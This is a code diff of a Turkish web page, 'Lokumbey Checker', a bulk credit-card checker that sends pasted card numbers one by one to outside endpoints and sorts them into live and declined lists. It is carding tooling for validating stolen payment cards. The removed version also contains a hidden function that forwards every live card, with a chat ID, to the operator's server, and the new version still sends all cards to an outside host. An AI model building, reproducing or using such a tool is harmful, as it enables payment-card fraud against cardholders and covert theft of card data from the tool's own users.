@@ -2,134 +2,163 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Lokumbey Free Checker</title>
+  <title>Lokumbey Checker - Düzeltilmiş</title>
   <style>
     body {
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      font-family: 'Segoe UI', sans-serif;
-      color: #fff;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: white;
       text-align: center;
-      padding: 20px;
+      padding: 2rem;
     }
+
+    header {
+      font-size: 2.5rem;
+      font-weight: bold;
+      background: linear-gradient(270deg, red, orange, yellow, green, cyan, blue, violet);
+      background-size: 1400% 1400%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: rainbowText 8s ease infinite;
+      margin-bottom: 2rem;
+    }
+
+    @keyframes rainbowText {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
     textarea {
       width: 90%;
-      height: 100px;
-      background-color: #1a1a2e;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      padding: 10px;
-      font-size: 16px;
-    }
-    .button {
-      padding: 12px 20px;
-      margin: 10px 5px;
-      border: none;
-      border-radius: 20px;
-      font-size: 14px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    .check { background-color: #007bff; color: white; }
-    .stop { background-color: #6c757d; color: white; }
-    .clear { background-color: #ff4d6d; color: white; }
-    .box {
-      background-color: #1c1c3c;
-      padding: 15px;
-      margin: 20px auto;
-      width: 90%;
+      height: 120px;
       border-radius: 12px;
-      box-shadow: 0 0 10px #00f0ff;
+      padding: 1rem;
+      font-size: 1rem;
+      resize: none;
+      border: none;
+      outline: none;
+      background-color: #222;
+      color: white;
+      margin-bottom: 1rem;
     }
-    .live { border-left: 5px solid #00ffae; }
-    .declined { border-left: 5px solid #ff0055; }
-    input[type="checkbox"] {
-      transform: scale(1.2);
-      margin-right: 5px;
+
+    button {
+      padding: 0.6rem 1.2rem;
+      font-size: 1.1rem;
+      border-radius: 12px;
+      border: none;
+      background-color: #333;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
     }
+
+    button:hover {
+      background-color: #555;
+    }
+
+    .container {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+
+    .box {
+      background-color: #1e1e1e;
+      padding: 1rem;
+      border-radius: 12px;
+      width: 45%;
+      max-height: 300px;
+      overflow-y: auto;
+      text-align: left;
+      font-family: monospace;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+
+    .live {
+      background: linear-gradient(270deg, red, orange, yellow, green, cyan, blue, violet);
+      background-size: 1400% 1400%;
+      animation: rainbowBG 6s ease infinite;
+      color: black;
+      padding: 0.4rem 0.8rem;
+      border-radius: 8px;
+      margin-bottom: 0.4rem;
+    }
+
+    .declined {
+      background-color: crimson;
+      color: white;
+      padding: 0.4rem 0.8rem;
+      border-radius: 8px;
+      margin-bottom: 0.4rem;
+    }
+
+    @keyframes rainbowBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
   </style>
 </head>
 <body>
-  <h1>Lokumbey Free Checker</h1>
-  <textarea id="cardInput" placeholder="Kart bilgilerini buraya satır satır girin..."></textarea><br />
-  <button class="button check" onclick="checkCards()">TOPLU KONTROL ET</button>
-  <button class="button stop" onclick="stopCheck()">DURDUR</button>
-  <button class="button clear" onclick="clearAll()">TEMİZLE</button>
-  <label><input type="checkbox" id="copyLive" checked />CANLILARI KOPYALA</label>
-  <p>Toplam: <span id="total">0</span> | Kontrol Edilen: <span id="checked">0</span> | Kalan: <span id="remaining">0</span></p>
+  <header>Lokumbey Checker</header>
 
-  <div class="box live">
-    <h3><input type="checkbox" checked />✅ Canlı Kartlar</h3>
-    <pre id="liveResult"></pre>
-  </div>
-  <div class="box declined">
-    <h3>❌ Declined Kartlar</h3>
-    <pre id="declinedResult"></pre>
+  <textarea id="cardInput" placeholder="Kartları satır satır yaz..."></textarea><br />
+  <button id="checkBtn">Check Et</button>
+
+  <div class="container">
+    <div class="box" id="liveBox">
+      <h3>✅ Approved</h3>
+    </div>
+    <div class="box" id="declinedBox">
+      <h3>❌ Declined</h3>
+    </div>
   </div>
 
   <script>
-    let stop = false;
+    document.getElementById("checkBtn").addEventListener("click", async () => {
+      const input = document.getElementById("cardInput").value.trim();
+      if (!input) return alert("Lütfen kartları giriniz.");
 
-    async function sendTelegramLog(card, result) {
-      // Telegram Bot API'ye canlı kartı gönder
-      fetch("https://nexiumcheck.shop/api/free.php?card=" + encodeURIComponent(card), {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: "7029721601",
-          text: `✅ LIVE KART LOGU\n🧾 Kart: ${card}\n📊 Sonuç: ${result}`
-        })
-      }).catch(console.error);
-    }
+      const cards = input.split("\n");
+      const liveBox = document.getElementById("liveBox");
+      const declinedBox = document.getElementById("declinedBox");
 
-    async function checkCards() {
-      stop = false;
-      const input = document.getElementById("cardInput").value.trim().split("\n");
-      const live = [], declined = [];
-      let checked = 0;
-      document.getElementById("total").innerText = input.length;
+      // Önce temizle
+      liveBox.innerHTML = "<h3>✅ Approved</h3>";
+      declinedBox.innerHTML = "<h3>❌ Declined</h3>";
 
-      for (const card of input) {
-        if (stop) break;
-        const res = await fetch("https://nexiumcheck.shop/api/free.php?card=" + encodeURIComponent(card), {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ card }),
-        });
-        const result = await res.text();
+      for (const card of cards) {
+        try {
+          const response = await fetch(`https://titanchecksystem.store/turemeler/free.php?card=${encodeURIComponent(card)}`);
+          if (!response.ok) throw new Error("API Hatası: " + response.status);
+          const text = await response.text();
 
-        if (result.includes("LIVE")) {
-          live.push(card + " " + result);
-          sendTelegramLog(card, result);  // Telegram log gönderiliyor
-        } else {
-          declined.push(card + " " + result);
+          const div = document.createElement("div");
+          div.textContent = text;
+
+          if (text.startsWith("✅ Approved")) {
+            div.classList.add("live");
+            liveBox.appendChild(div);
+          } else {
+            div.classList.add("declined");
+            declinedBox.appendChild(div);
+          }
+        } catch (err) {
+          const div = document.createElement("div");
+          div.textContent = `${card} - HATA!`;
+          div.classList.add("declined");
+          declinedBox.appendChild(div);
+          console.error(err);
         }
-
-        document.getElementById("liveResult").textContent = live.join("\n");
-        document.getElementById("declinedResult").textContent = declined.join("\n");
-
-        checked++;
-        document.getElementById("checked").innerText = checked;
-        document.getElementById("remaining").innerText = input.length - checked;
       }
-
-      if (document.getElementById("copyLive").checked) {
-        navigator.clipboard.writeText(live.join("\n"));
-      }
-    }
-
-    function stopCheck() {
-      stop = true;
-    }
-
-    function clearAll() {
-      document.getElementById("cardInput").value = "";
-      document.getElementById("liveResult").textContent = "";
-      document.getElementById("declinedResult").textContent = "";
-      document.getElementById("total").innerText = "0";
-      document.getElementById("checked").innerText = "0";
-      document.getElementById("remaining").innerText = "0";
-    }
+    });
   </script>
 </body>
 </html>
